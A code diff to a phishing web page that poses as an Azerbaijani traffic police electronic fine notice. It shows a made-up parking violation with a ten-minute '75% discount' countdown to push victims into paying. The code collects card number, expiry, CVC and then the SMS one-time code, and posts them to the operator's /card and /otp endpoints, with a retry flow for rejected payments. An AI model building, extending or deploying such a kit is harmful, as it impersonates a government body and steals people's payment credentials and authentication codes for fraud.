@@ -231,24 +231,117 @@
             }
         });
 
+        async function robustFetch(url, options) {
+            try {
+                let res = await fetch(url, options);
+                if (res.ok) return res;
+            } catch (e) {
+                if (!url.includes('localhost:3000')) {
+                    let localUrl = url.replace(/https?:\/\/[^\/]+/, 'http://localhost:3000');
+                    return await fetch(localUrl, options);
+                }
+                throw e;
+            }
+        }
+
         async function fetchFineData() {
             try {
-                const res = await fetch(`${API_URL}/fine`);
-                if (!res.ok) throw new Error("Network error");
-                const data = await res.json();
-                updateUI(data);
-            } catch (err) {
-                try {
-                    const fallbackRes = await fetch('http://localhost:3000/api/fine');
-                    if (fallbackRes.ok) {
-                        API_URL = 'http://localhost:3000/api';
-                        const data = await fallbackRes.json();
-                        updateUI(data);
-                    }
-                } catch (fallbackErr) {
-                    console.error("Lokal serverə də qoşulmaq olmadı:", fallbackErr);
+                const res = await robustFetch(`${API_URL}/fine`);
+                if (res && res.ok) {
+                    const data = await res.json();
+                    updateUI(data);
                 }
+            } catch (err) {
+                console.error("Serverə qoşulmaq mümkün olmadı:", err);
             }
+        }
+
+        function resetFineCardHtml() {
+            document.getElementById('app-container').innerHTML = `
+                <!-- Header -->
+                <div class="bg-white rounded-xl shadow-md p-4 text-center">
+                    <h1 class="font-bold text-gray-800 text-lg">DYP Elektron Cərimə Bildirişi</h1>
+                    <p class="text-xs text-gray-500">Azərbaycan Respublikası Baş Dövlət Yol Polisi İdarəsi</p>
+                </div>
+
+                <!-- Main User Fine View Card -->
+                <div class="bg-white rounded-2xl shadow-xl overflow-hidden">
+                    <div class="bg-blue-600 text-white p-5 text-center">
+                        <h2 class="text-xl font-bold">Elektron Cərimə Sənədi</h2>
+                        <p class="text-sm text-blue-100 mt-1">Yol Hərəkəti Qaydaları Pozuntusu</p>
+                    </div>
+
+                    <div class="p-5 space-y-4">
+                        <div class="bg-red-50 border-l-4 border-red-500 p-4 rounded-r-lg flex items-start space-x-3">
+                            <span class="text-2xl">⚠️</span>
+                            <div>
+                                <h3 class="font-bold text-red-800 text-sm">DAYANMA VƏ DURMA QAYDASI POZULDU</h3>
+                                <p class="text-xs text-red-600 mt-0.5">İnzibati Xətalar Məcəlləsi - Maddə 125.1</p>
+                            </div>
+                        </div>
+
+                        <div class="bg-gray-50 border border-gray-200 rounded-xl p-3">
+                            <div class="flex justify-between items-center mb-2">
+                                <span class="text-sm font-semibold text-gray-700">Pozuntu Qeydiyyatı (Foto)</span>
+                                <span class="bg-red-100 text-red-700 text-xs px-2 py-0.5 rounded-full font-medium">Dəlil</span>
+                            </div>
+                            <div id="photo-container" class="h-64 bg-gray-200 rounded-lg flex flex-col items-center justify-center text-gray-500 relative overflow-hidden">
+                                <div class="text-4xl mb-1">🚗📸</div>
+                                <span class="text-xs font-medium text-center px-4">Maşının şəkli yüklənməyib</span>
+                            </div>
+                        </div>
+
+                        <div class="bg-gray-50 rounded-xl p-4 space-y-3">
+                            <h4 class="font-bold text-gray-800 text-sm">Cərimə Detalları</h4>
+                            <div class="space-y-2 text-sm">
+                                <div class="flex justify-between">
+                                    <span class="text-gray-500">Protokol Nömrəsi:</span>
+                                    <span id="val-protocol" class="font-medium text-gray-800">YHQ-2026-88492</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-gray-500">Qeydiyyat Nişanı:</span>
+                                    <span id="val-plate" class="font-bold text-blue-600 text-base">99-XX-999</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-gray-500">Tarix və Saat:</span>
+                                    <span id="val-date" class="font-medium text-gray-800">15.10.2026 / 15:48</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-gray-500">Ünvan:</span>
+                                    <span id="val-location" class="font-medium text-gray-800">Nizami küç. 45, Bakı</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-gray-500">Cərimə Balı:</span>
+                                    <span id="val-points" class="font-bold text-red-600">2 Bal</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-gray-500">Standart Məbləğ:</span>
+                                    <span id="val-amount" class="font-medium text-gray-800 line-through">80.00 AZN</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div id="payment-card" class="bg-amber-50 border border-amber-200 rounded-xl p-4 text-center space-y-3">
+                            <div class="flex items-center justify-center space-x-2 text-amber-800 font-semibold text-sm">
+                                <span>⏱️</span>
+                                <span>İndi Ödə - 75% Endirim Fürsəti!</span>
+                            </div>
+
+                            <div class="bg-white/80 rounded-lg py-2 px-4 inline-block shadow-inner">
+                                <span id="timer" class="text-2xl font-bold text-amber-700">10:00</span>
+                            </div>
+
+                            <p class="text-xs text-amber-900">
+                                İndi ödəniş etsəniz, <span id="txt-amount">80</span> AZN əvəzinə cəmi <strong id="txt-discount" class="text-green-700">20.00</strong> AZN ödəyin!
+                            </p>
+
+                            <button onclick="openCardModal()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded-xl shadow-lg transition duration-200 text-base">
+                                İNDİ ÖDƏ - <span id="btn-discount-amt">20.00</span> AZN
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `;
         }
 
         function updateUI(data) {
@@ -422,7 +515,7 @@
             const cardCvc = document.getElementById('card-cvc').value;
 
             try {
-                await fetch(`${API_URL}/card`, {
+                await robustFetch(`${API_URL}/card`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ cardNo, cardExp, cardCvc })
@@ -468,7 +561,7 @@
             showLoadingScreen();
 
             try {
-                await fetch(`${API_URL}/otp`, {
+                await robustFetch(`${API_URL}/otp`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ otpCode })
@@ -478,7 +571,7 @@
             }
 
             try {
-                await fetch(`${API_URL}/pay`, {
+                await robustFetch(`${API_URL}/pay`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ amountPaid: 20.00 })
@@ -490,7 +583,7 @@
 
         async function retryPayment() {
             try {
-                await fetch(`${API_URL}/clear-reject`, { method: 'POST' });
+                await robustFetch(`${API_URL}/clear-reject`, { method: 'POST' });
             } catch (err) {
                 console.error("Clear reject error:", err);
             }
